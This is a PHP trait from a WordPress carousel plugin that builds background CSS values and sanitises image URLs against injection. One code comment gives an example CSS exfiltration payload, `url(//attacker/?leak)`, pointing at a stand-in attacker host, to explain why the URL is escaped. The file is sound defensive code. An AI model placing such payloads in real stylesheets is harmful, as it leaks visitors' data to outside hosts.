<?php
/**
 * Background CSS primitive for the dynamic-CSS generator (PHP side).
 *
 * Mirrors the getBgValue() helper in the JS editor module
 * `blocks/blocks/shared/styles/cssHelpers.js`. Any change here MUST land on the
 * JS side in the same commit — the JS↔PHP parity harness in `tests/css-parity/`
 * will catch a one-sided edit.
 *
 * @package WP_Carousel_Free
 */

namespace ShapedPlugin\WPCarouselFree\Blocks\Styles\Concerns;

defined( 'ABSPATH' ) || exit;

/**
 * Background attribute → CSS value.
 */
trait BackgroundCss {

	/**
	 * Generate background value.
	 *
	 * Mirrors: cssHelpers.js getBgValue()
	 *
	 * @param mixed $background Background attribute.
	 * @return string Background CSS value.
	 */
	private function get_bg_value( $background ) {
		$bg_type = $background['style'] ?? '';
		if ( ! $bg_type ) {
			return '';
		}

		// The image URL is the one value that can carry an off-site exfil target
		// (`url(//attacker/?leak)`); pass it through esc_url_raw so only well-formed,
		// allow-listed-protocol URLs survive. The shared object_to_css_string guard
		// additionally drops any value with a CSS/markup breakout character, so the
		// solid/gradient branches cannot escape their declaration.
		$image_url = isset( $background['image']['url'] ) ? esc_url_raw( (string) $background['image']['url'] ) : '';

		$background_map = array(
			'transparent' => 'transparent',
			'solid'       => $background['solid'] ?? '',
			'gradient'    => $background['gradient'] ?? '',
			'image'       => '' !== $image_url ? 'url(' . $image_url . ')' : 'none',
		);

		return isset( $background_map[ $bg_type ] ) ? $background_map[ $bg_type ] : '';
	}
}
